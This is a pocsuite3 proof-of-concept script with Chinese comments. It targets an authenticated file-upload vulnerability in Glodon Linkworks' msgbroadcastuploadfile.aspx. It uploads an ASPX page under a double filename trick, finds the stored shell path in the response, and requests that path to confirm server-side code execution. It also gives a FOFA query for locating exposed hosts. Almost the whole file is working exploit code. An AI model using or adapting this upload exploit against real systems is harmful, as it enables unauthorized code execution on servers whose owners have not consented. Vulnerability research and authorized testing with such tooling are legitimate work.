#!/usr/bin/env python
# coding: utf-8
from collections import OrderedDict
from urllib.parse import urljoin
import re,random,hashlib,base64,json
from pocsuite3.api import POCBase, Output, register_poc, logger, requests, OptDict, OptString, VUL_TYPE
from pocsuite3.api import REVERSE_PAYLOAD, POC_CATEGORY


class POC(POCBase):
    vulID = '0'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1'  #默认为1
    author = ['']  #  PoC作者的大名
    vulDate = '2023-08-12'  #漏洞公开的时间,不知道就写今天
    createDate = '2023-08-12'  # 编写 PoC 的日期
    updateDate = '2023-08-12'  # PoC 更新的时间,默认和编写时间一样
    references = ['']  # 漏洞地址来源,0day不用写
    name = ''  # PoC 名称
    appPowerLink = ''  # 漏洞厂商主页地址
    appName = ''  # 漏洞应用名称
    appVersion = ''''''  # 漏洞影响版本
    vulType = VUL_TYPE.UPLOAD_FILES #漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
        fofa:body="/Services/Identification/"
        广联达 Linkworks msgbroadcastuploadfile.aspx 存在后台文件上传漏洞，攻击者通过SQL注入获取管理员信息后，可以登陆发送请求包获取服务器权限
    '''
  # 漏洞简要描述
    samples = ['']  # 测试样列,就是用 PoC 测试成功的网站
    install_requires = ['']  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    pocDesc = '''
    检测:pocsuite -r .\poc++.py -u url(-f url.txt) --verify --ck 'cookie值'
    '''
    category = POC_CATEGORY.EXPLOITS.REMOTE
    
    
    def _options(self):
        o = OrderedDict()
        o["ck"] = OptString(default='',description='输入登录后的cookie',require=False)
        return o
    # 生成任意8位字符  
    def generate_random_string(selff,length=8):  
        chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'  
        return ''.join(random.choice(chars) for _ in range(length))
    # 使用MD5加密  
    def md5_encrypt(self,text):  
        m = hashlib.md5()  
        m.update(text.encode('utf-8'))  
        return m.hexdigest()
    def _verify(self):
        # 生成随机字符串并加密  
        random_string = self.generate_random_string()  
        # md5加密
        encrypted_string = self.md5_encrypt(random_string)
        result = {}
        path ="/gtp/im/services/group/msgbroadcastuploadfile.aspx"
        ck = self.get_option("ck")
        headers={
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36',
            'Cookie': ck,
            'Content-Type': 'multipart/form-data; boundary=----123'
        }
        encoded_string = base64.b64encode(encrypted_string.encode('utf-8')).decode('utf-8')
        payload =f'''------123
Content-Disposition: form-data; filename="1.aspx";filename="1.jpg"
Content-Type: application/text

<%@Page Language="C#"%><%Response.Write(System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String("{encoded_string}")));System.IO.File.Delete(Request.PhysicalPath);%>

------123'''
        try:
            
            resq  = requests.post(url=self.url+path,headers=headers,data=payload,timeout=10,verify=False,allow_redirects=False)
            if resq.status_code == 200 and 'success:true' in resq.text:
                #print(resq.text)
                shell_name = re.search("(?<=result:')(.*)(.aspx)",resq.text).group()
                #print(shell_name)
                shell_path = '/GTP/IM/Services/Group/Upload/'+ shell_name
                resq_2  = requests.get(url=self.url+shell_path,headers=headers,timeout=10,verify=False)
                if encrypted_string in resq_2.text:
                    result['VerifyInfo'] = {}
                    result['VerifyInfo']['URL'] = self.url + path
                    result['VerifyInfo']['shell_path'] = self.url + shell_path
        except Exception as e:
            return
        return self.parse_output(result)         

    def _attack(self):
        return self._verify()
    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _shell(self):
        return

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
    
register_poc(POC)